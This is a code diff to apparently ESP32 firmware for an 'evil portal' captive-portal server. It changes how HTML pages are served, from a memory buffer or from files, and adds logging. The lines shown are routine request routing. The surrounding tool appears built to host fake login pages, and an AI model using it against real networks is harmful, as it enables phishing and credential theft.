@@ -1203,8 +1203,22 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
 
     const char *u = req->uri;
     size_t ulen = strlen(u);
-    if ((ulen >= 4 && (strcmp(u + ulen - 4, ".png") == 0 || strcmp(u + ulen - 4, ".jpg") == 0 || strcmp(u + ulen - 4, ".css") == 0 || strcmp(u + ulen - 3, ".js") == 0)) ||
-        (ulen >= 5 && strcmp(u + ulen - 5, ".html") == 0)) {
+    bool is_html = (ulen >= 5 && strcmp(u + ulen - 5, ".html") == 0);
+
+    if (is_html && html_buffer != NULL && html_buffer_size > 0) {
+        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+        esp_err_t r = portal_handler(req);
+        ESP_LOGI(TAG, "Served HTML URL via buffer portal for URI: %s", u);
+        ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size());
+        return r;
+    }
+
+    if (ulen >= 4 && (strcmp(u + ulen - 4, ".png") == 0 || strcmp(u + ulen - 4, ".jpg") == 0 || strcmp(u + ulen - 4, ".css") == 0 || strcmp(u + ulen - 3, ".js") == 0)) {
+        file_handler(req);
+        return ESP_OK;
+    }
+
+    if (is_html) {
         file_handler(req);
         return ESP_OK;
     }
@@ -1284,7 +1298,8 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_uri_t portal_js = {
             .uri = ".js", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
         httpd_uri_t portal_html = {
-            .uri = ".html", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
+            .uri = ".html", .method = HTTP_GET,
+            .handler = (use_html_buffer ? portal_handler : file_handler), .user_ctx = NULL};
         httpd_register_uri_handler(evilportal_server, &portal_android_get);
         httpd_register_uri_handler(evilportal_server, &portal_android_head);
         httpd_register_uri_handler(evilportal_server, &portal_android_gen_get);
